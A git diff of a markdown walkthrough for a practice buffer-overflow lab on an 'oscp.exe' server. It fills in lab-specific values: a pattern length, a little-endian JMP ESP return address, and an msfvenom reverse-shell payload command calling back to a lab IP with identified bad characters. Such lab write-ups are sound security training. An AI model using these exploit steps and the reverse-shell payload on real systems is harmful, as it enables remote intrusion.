@@ -114,7 +114,7 @@ except:
 
 Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):
 ```sh
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
 ```
 
 Copy the output and place it into the payload variable of the exploit.py script.
@@ -128,7 +128,7 @@ python3 exploit.py
 
 The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:
 ```
-!mona findmsp -distance 600
+!mona findmsp -distance 2400
 ```
 
 Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).
@@ -182,11 +182,20 @@ This command finds all "jmp esp" (or equivalent) instructions with addresses tha
 
 Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
 
+Choose the one that has many False and for this case, I choose the top one.
+
+![image](https://github.com/vivekprm/hackers-manual/assets/2403660/d25f38d9-8d94-4a01-87de-32f410a819e3)
+
+Update our retn variable with the new address and must be written backward (since the system is little-endian).
+```
+\xaf\x11\x50\x62
+```
+
 ## Generate Payload
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
 ```sh
-msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.253.147 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
 ```
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
